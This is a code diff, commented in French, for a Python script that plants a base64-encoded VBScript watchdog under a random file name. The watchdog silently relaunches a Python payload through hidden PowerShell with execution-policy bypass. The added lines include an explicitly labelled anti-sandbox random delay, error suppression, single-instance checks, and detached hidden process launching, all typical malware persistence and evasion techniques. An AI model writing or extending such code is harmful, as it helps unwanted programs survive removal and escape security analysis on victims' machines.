@@ -12,24 +12,44 @@ from queue import Empty
 import time
 import random
 import base64
+import psutil
 
-vbs_template = r'''Set WshShell = CreateObject("WScript.Shell")
+vbs_template = r'''On Error Resume Next
+Set WshShell = CreateObject("WScript.Shell")
 Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
 target = "{script_path}"
+
+' Éviter exécution multiple de ce même watchdog
+Set colMe = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe' OR Name='cscript.exe'")
+count = 0
+For Each proc In colMe
+    If InStr(LCase(proc.CommandLine), LCase(WScript.ScriptName)) > 0 Then
+        count = count + 1
+    End If
+Next
+If count > 1 Then
+    WScript.Quit
+End If
+
+' Sleep aléatoire initial (anti-sandbox)
 Randomize
-WScript.Sleep (Int((30 * Rnd) + 5) * 1000) ' Sleep initial aléatoire entre 5 et 15 secondes
+WScript.Sleep (Int((80 * Rnd) + 10) * 1000)
+
 Do
     found = False
-    Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where Name='python.exe' or Name='pythonw.exe'")
-    For Each objProcess in colProcessList
-        If InStr(LCase(objProcess.CommandLine), LCase(target)) > 0 Then
+    Set colProcessList = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='python.exe' OR Name='pythonw.exe'")
+    For Each objProcess In colProcessList
+        If InStr(LCase(objProcess.CommandLine), LCase(" " & target & " ")) > 0 Or _
+           Right(LCase(objProcess.CommandLine), Len(target)) = LCase(target) Then
             found = True
             Exit For
         End If
     Next
+
     If Not found Then
         WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Start-Process -WindowStyle Hidden -FilePath 'pythonw.exe' -ArgumentList '" & target & "'""", 0, False
     End If
+
     WScript.Sleep 5000
 Loop
 '''
@@ -81,6 +101,16 @@ def deleteVbsFileAfterFinish():
         except Exception as e:
             print(f"[!] Erreur suppresion watchdog dans {file}: {e}")
 
+def is_process_running(script_path):
+    for proc in psutil.process_iter(['name', 'cmdline']):
+        try:
+            if 'wscript.exe' in proc.info['name'].lower():
+                if script_path.lower() in ' '.join(proc.info['cmdline']).lower():
+                    return True
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            continue
+    return False
+
 def create_watchdog_vbs():
     script_final = vbs_template.format(script_path=script_python_path.replace("\\", "\\\\"))
     b64_vbs = base64.b64encode(script_final.encode()).decode()
@@ -101,13 +131,15 @@ def create_watchdog_vbs():
             if existing_vbs:
                 print(f"[!] Fichier watchdog déjà présent dans {folder}, watchdog non créé.")
                 vbs_exist_path = os.path.join(folder, existing_vbs[0])
-                subprocess.Popen(
-        ["wscript.exe", vbs_exist_path],
-        creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL,
-        stdin=subprocess.DEVNULL
-    )
+                if is_process_running(vbs_exist_path):
+                    print(f"[!] Watchdog déjà actif : {vbs_exist_path}")
+                else:
+                    subprocess.Popen(
+                        ["wscript.exe", vbs_exist_path],
+                        creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
+                        stdout=subprocess.DEVNULL,
+                        stderr=subprocess.DEVNULL,
+                        stdin=subprocess.DEVNULL)
 
             random_name = f"watchdog_{secrets.token_hex(4)}.vbs"
             vbs_path = os.path.join(folder, random_name)
